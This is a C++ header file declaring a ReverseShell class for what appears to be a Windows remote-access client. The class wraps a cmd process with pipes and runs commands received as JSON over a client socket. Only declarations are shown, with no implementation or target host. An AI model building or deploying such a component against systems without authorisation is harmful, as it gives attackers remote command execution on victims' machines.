#ifndef CLIENT_REVERSESHELL_H
#define CLIENT_REVERSESHELL_H
#include <fcntl.h>
#include <string>
#include <array>
#include <memory>
#include <iostream>
#include <cstring>
#include "Sender.h"
#include "json.hpp"
#include <windows.h>
#include "ClientSocket.h"
#include "Handler.h"



class ReverseShell : public Handler {
private:
    std::string currentDirectory=".";
    HANDLE hWrite{}, hRead{};
    HANDLE hWriteCmd{}, hReadCmd{};
    PROCESS_INFORMATION pi{};
    std::atomic<bool> isShellOpen = false;
public:
    void readOutput();
    explicit ReverseShell(ClientSocket &clientSocket);
    void initializeCMDProcess();
    void closeCMDProcess();
    void runCommand(nlohmann::json jsonObject);
};


#endif
